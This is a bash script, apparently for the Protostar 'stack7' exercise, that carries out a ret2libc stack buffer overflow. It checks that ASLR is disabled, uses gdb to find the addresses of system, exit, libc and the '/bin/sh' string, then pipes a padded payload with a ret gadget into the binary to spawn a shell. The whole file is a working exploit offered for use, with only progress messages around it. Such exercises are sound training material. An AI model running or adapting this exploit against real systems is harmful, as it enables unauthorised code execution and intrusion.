#!/bin/bash

BIN_NAME=./stack7

#################################################
# All kind of configurations and checks
# go here
#################################################

echo "===> Checking $BIN_NAME exists"

if [ ! -f "$BIN_NAME" ]; then
    echo "[-] $BIN_NAME must exist to exploit it"
    exit 1
fi

echo "===> $BIN_NAME correct"

echo "===> Checking gdb exists"

which gdb 2> /dev/null > /dev/null
if [ $? -eq 1 ]; then
    echo "[-] You don't have gdb installed, weird for Linux distribution, install and run again"
    exit 1
fi

echo "===> gdb correct"

echo "===> Checking ASLR"
ASLR_VALUE=`cat /proc/sys/kernel/randomize_va_space`
if [ $ASLR_VALUE != "0" ]; then
    echo "[-] ASLR value is not 0, please modify it and run again the exploit"
    exit 1
fi
echo "===> ASLR desactivated"

#################################################
# Here finish configurations
#################################################

ADDRESS_SYSTEM=`gdb -q $BIN_NAME -batch -ex "b main" -ex "r" -ex "p system" 2> /dev/null | awk '/system/{ print $8  }'`

echo "===> Address of system in memory $ADDRESS_SYSTEM"

ADDRESS_EXIT=`gdb -q $BIN_NAME -batch -ex "b main" -ex "r" -ex "p exit" 2> /dev/null | awk '/exit/{ print $8 }'`

echo "===> Address of exit in memory $ADDRESS_EXIT"

ADDRESS_LIBC1=`gdb -q $BIN_NAME --batch -ex "b main" -ex "r" -ex "info proc map" 2> /dev/null | awk '/libc-/{NR==1;print $1;exit}'`

echo "===> Address of libc while running $ADDRESS_LIBC1"

OFFSET_BIN_SH=`strings -t d /lib/libc.so.6 | grep /bin/sh | cut -d " " -f 1`

echo "===> Offset /bin/sh string in libc $OFFSET_BIN_SH"

ADDRESS_BIN_SH=$((ADDRESS_LIBC1+OFFSET_BIN_SH))
ADDRESS_BIN_SH=`python -c "print '0x%08x' % ($ADDRESS_BIN_SH)"`

echo "===> Address of /bin/sh in memory $ADDRESS_BIN_SH"

ADDRESS_POP_RET=0x08048552

echo "===> Address of pop;ret gadget $ADDRESS_POP_RET"

ADDRESS_RET=0x08048553

echo "===> Address of ret $ADDRESS_RET"

echo "========> EXPLOITING... ENJOY YOUR SHELL"

sleep 2

(python -c "import struct;a = 'A'*80 + struct.pack('I', $ADDRESS_RET) + struct.pack('I', $ADDRESS_SYSTEM) + struct.pack('I',$ADDRESS_POP_RET) + struct.pack('I', $ADDRESS_BIN_SH) + struct.pack('I', $ADDRESS_EXIT) + '\n'; print a";cat) | $BIN_NAME
